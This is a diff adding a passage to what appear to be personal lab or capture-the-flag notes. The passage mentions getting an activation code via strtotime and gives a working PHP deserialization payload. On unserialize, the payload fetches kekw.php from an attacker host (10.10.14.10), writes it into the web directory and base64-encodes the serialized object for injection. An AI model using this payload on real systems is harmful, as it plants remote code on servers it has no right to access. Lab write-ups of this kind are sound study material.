@@ -35,6 +35,41 @@ Redirect
 
 
 ![[Pasted image 20230114173505.png]]
+got activation code using strtotime 
+serialization attack on changing theme 
+
+
+```
+<?php 
+class Avatar {
+	public $imgPath;
+	
+	 public function __construct($imgPath) { 
+		 $this->imgPath = $imgPath;
+	 }
+	 
+	public function save($tmp) { 
+		$f = fopen($this->imgPath, "w");
+		fwrite($f, file_get_contents($tmp));
+		fclose($f);     
+	} 
+}
+class AvatarInterface { 
+	public $tmp = "http://10.10.14.10/kekw.php"; 
+	public $imgPath = "./kekw.php";
+	public function __wakeup() {
+		$a = new Avatar($this->imgPath); 
+		$a->save($this->tmp);
+	} 
+}
+$payload = base64_encode(serialize(new AvatarInterface)); 
+echo $payload; 
+?>
+
+
+```
+
+
 
 # Foothold 
 
